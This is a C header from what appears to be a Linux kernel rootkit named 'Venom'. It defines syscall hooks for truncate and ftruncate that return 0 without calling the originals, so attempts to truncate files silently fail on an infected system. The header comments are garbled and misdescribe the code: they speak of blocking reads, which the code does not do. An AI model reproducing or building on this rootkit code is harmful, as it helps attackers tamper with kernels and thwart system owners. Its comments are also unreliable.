/* 
 * Venom 
 * ---------------------------------------------------------------------------
 * File: truncate.c 
 *
 * Purpose:
 *  - Hooks `orig_truncate_t` and `orig_ftruncate_t` this doesn't allow to view any size of bytes from files 
 *
 * Contents (documentation-only):
 *  - Does not allow to read certain files
 * 
 * Author: devilzsecurity 
 */



#ifndef TRUNCATE_HOOK_H
#define TRUNCATE_HOOK_H

#include <linux/kernel.h>
#include <linux/uaccess.h>
#include <linux/module.h>
#include <linux/sched.h>

// no need to look just look at the regs strcuture
typedef asmlinkage long (*orig_truncate_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_ftruncate_t)(const struct pt_regs *);

static orig_truncate_t orig_truncate = NULL; // holding area 
static orig_ftruncate_t orig_ftruncate = NULL;

// main area  or our main logic of the hook
notrace asmlinkage long hook_truncate(const struct pt_regs *regs)
{
    char kd[256] = "";
    const char __user *pathname = (const char __user *)regs->di;
    unsigned long length = (unsigned long)regs->si;

    if (pathname && strncpy_from_user(kd, pathname, sizeof(kd) - 1) < 0)
        kd[0] = '\0';
    
    return 0; 
}

//  out ftruncate hook area easy hook not hard 
notrace asmlinkage long hook_ftruncate(const struct pt_regs *regs)
{
    int fd = (int)regs->di;
    unsigned long length = (unsigned long)regs->si;


    return 0;
}

#endif 
